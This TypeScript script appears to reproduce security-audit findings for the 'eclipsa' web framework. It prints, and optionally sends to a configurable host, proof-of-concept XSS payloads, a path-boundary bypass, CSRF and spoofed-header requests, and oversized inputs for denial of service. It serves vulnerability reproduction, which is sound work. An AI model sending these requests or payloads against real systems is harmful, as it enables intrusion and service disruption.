type Severity = 'high' | 'medium' | 'low'

type ReproCase = {
  id: string
  severity: Severity
  title: string
  targetFile: string
  run: (context: { baseUrl: string; execute: boolean }) => Promise<void> | void
}

const printHeader = (value: string) => {
  console.log(`\n=== ${value} ===`)
}

const printCase = (repro: ReproCase) => {
  console.log(`[${repro.severity.toUpperCase()}] ${repro.id} ${repro.title}`)
  console.log(`target: ${repro.targetFile}`)
}

const dryRunHint = () => {
  console.log('dry-run mode: add --execute to actually send requests')
}

const cases: ReproCase[] = [
  {
    id: 'R-01',
    severity: 'high',
    title: 'serve-static path boundary check bypass',
    targetFile: '/home/runner/work/eclipsa/eclipsa/docs/scripts/serve-static.ts',
    run() {
      printHeader('PoC')
      console.log(`const root = '/var/www/dist/client'`)
      console.log(`const escaped = '/var/www/dist/client2/secret.txt'`)
      console.log(`console.log(escaped.startsWith(root)) // true (unexpected)`)
    },
  },
  {
    id: 'R-02',
    severity: 'high',
    title: 'action endpoint CSRF (no token/origin guard)',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/eclipsa/core/action.ts',
    async run({ baseUrl, execute }) {
      printHeader('PoC')
      const body = {
        input: {
          __eclipsa_type: 'object',
          entries: [['amount', 1]],
        },
      }
      const url = `${baseUrl}/__eclipsa/action/sum`
      if (!execute) {
        dryRunHint()
        console.log(`POST ${url}`)
        console.log(
          `headers: {"content-type":"application/eclipsa-action+json","x-eclipsa-route-url":"${baseUrl}/actions"}`,
        )
        console.log(JSON.stringify(body))
        return
      }
      const response = await fetch(url, {
        body: JSON.stringify(body),
        headers: {
          'content-type': 'application/eclipsa-action+json',
          'x-eclipsa-route-url': `${baseUrl}/actions`,
        },
        method: 'POST',
      })
      console.log('status:', response.status)
      console.log('body:', await response.text())
    },
  },
  {
    id: 'R-03',
    severity: 'medium',
    title: 'route scoping via spoofable x-eclipsa-route-url',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/eclipsa/vite/dev-app/mod.ts',
    async run({ baseUrl, execute }) {
      printHeader('PoC')
      const url = `${baseUrl}/__eclipsa/loader/secure-loader`
      if (!execute) {
        dryRunHint()
        console.log(`GET ${url}`)
        console.log(`headers: {"x-eclipsa-route-url":"${baseUrl}/secure/123"}`)
        return
      }
      const response = await fetch(url, {
        headers: {
          'x-eclipsa-route-url': `${baseUrl}/secure/123`,
        },
      })
      console.log('status:', response.status)
      console.log('body:', await response.text())
    },
  },
  {
    id: 'R-04',
    severity: 'medium',
    title: 'unbounded action input size',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/eclipsa/core/action.ts',
    async run({ baseUrl, execute }) {
      printHeader('PoC')
      const huge = 'x'.repeat(20 * 1024 * 1024)
      const body = JSON.stringify({
        input: {
          __eclipsa_type: 'object',
          entries: [['blob', huge]],
        },
      })
      const url = `${baseUrl}/__eclipsa/action/sum`
      if (!execute) {
        dryRunHint()
        console.log(`payload bytes: ${body.length}`)
        console.log(`POST ${url}`)
        return
      }
      const response = await fetch(url, {
        body,
        headers: {
          'content-type': 'application/eclipsa-action+json',
          'x-eclipsa-route-url': `${baseUrl}/actions`,
        },
        method: 'POST',
      })
      console.log('status:', response.status)
      console.log('body:', await response.text())
    },
  },
  {
    id: 'R-05',
    severity: 'high',
    title: 'markdown html rendered without sanitization',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/content/internal.ts',
    run() {
      printHeader('PoC markdown')
      console.log('---')
      console.log('# title')
      console.log('<img src=x onerror=alert("xss-from-markdown") />')
      console.log('<script>alert("xss-script-tag")</script>')
      console.log('---')
      console.log('render this entry with @eclipsa/content render() and open in browser')
    },
  },
  {
    id: 'R-06',
    severity: 'high',
    title: 'Content component raw HTML injection',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/content/mod.ts',
    run() {
      printHeader('PoC component')
      console.log(`import { Content } from '@eclipsa/content'`)
      console.log(
        `export default () => Content({ html: '<img src=x onerror=alert("xss-content") />' })`,
      )
    },
  },
  {
    id: 'R-07',
    severity: 'medium',
    title: 'third-party script without SRI',
    targetFile: '/home/runner/work/eclipsa/eclipsa/docs/app/+ssr-root.tsx',
    run() {
      printHeader('PoC')
      console.log(
        `<script src="https://cdn.jsdelivr.net/npm/eruda"></script> // no integrity / crossorigin`,
      )
    },
  },
  {
    id: 'R-08',
    severity: 'medium',
    title: 'route payload extraction with regex script parsing',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/eclipsa/core/runtime.ts',
    run() {
      printHeader('PoC html')
      console.log('<script id="eclipsa-resume">{"ok":1}</script>')
      console.log('<script id="eclipsa-resume" type="text/plain">tampered</script>')
      console.log('duplicate id + type mismatch can confuse regex-based extraction order')
    },
  },
  {
    id: 'R-09',
    severity: 'low',
    title: 'search prefix linear scan amplification',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/content/search.ts',
    run() {
      printHeader('PoC')
      console.log('create index with many keys and query single prefix repeatedly')
      console.log(
        `for (let i = 0; i < 1_000; i++) searchContentIndex(bigIndex, 'a', { prefix: true })`,
      )
    },
  },
  {
    id: 'R-10',
    severity: 'medium',
    title: 'image plugin load path check mismatch',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/image/vite.ts',
    run() {
      printHeader('PoC import')
      console.log(
        `import img from '/absolute/path/outside/root/secret.png?eclipsa-image&widths=320&format=webp'`,
      )
      console.log('resolveId/load path should be compared against allowed roots like dev endpoint')
    },
  },
  {
    id: 'R-11',
    severity: 'low',
    title: 'asset name hash ignores file content',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/image/vite.ts',
    run() {
      printHeader('PoC')
      console.log('same path, different image bytes -> createAssetName() still identical')
      console.log(`createAssetName('/app/assets/a.png', 960, 'webp') // same output each build`)
    },
  },
  {
    id: 'R-12',
    severity: 'low',
    title: 'unbounded widths fan-out in image transform',
    targetFile: '/home/runner/work/eclipsa/eclipsa/packages/image/vite.ts',
    run() {
      printHeader('PoC import')
      console.log(
        `import img from './hero.png?eclipsa-image&format=webp&widths=${Array.from({ length: 800 }, (_, i) => i + 1).join(',')}'`,
      )
      console.log('buildVariantAssets() runs for each accepted width')
    },
  },
]

const parseArgs = (argv: string[]) => {
  const parsed = {
    baseUrl: 'http://localhost:5173',
    caseId: null as string | null,
    execute: false,
  }

  for (let index = 0; index < argv.length; index += 1) {
    const current = argv[index]
    if (current === '--execute') {
      parsed.execute = true
      continue
    }
    if (current === '--base-url') {
      parsed.baseUrl = argv[index + 1] ?? parsed.baseUrl
      index += 1
      continue
    }
    if (current === '--case') {
      parsed.caseId = argv[index + 1] ?? null
      index += 1
    }
  }

  return parsed
}

const run = async () => {
  const args = parseArgs(process.argv.slice(2))
  const selected = args.caseId
    ? cases.filter((entry) => entry.id.toLowerCase() === args.caseId!.toLowerCase())
    : cases

  if (selected.length === 0) {
    console.error('no matching case')
    process.exitCode = 1
    return
  }

  for (const entry of selected) {
    printCase(entry)
    await entry.run({
      baseUrl: args.baseUrl,
      execute: args.execute,
    })
  }
}

if (import.meta.main) {
  await run()
}
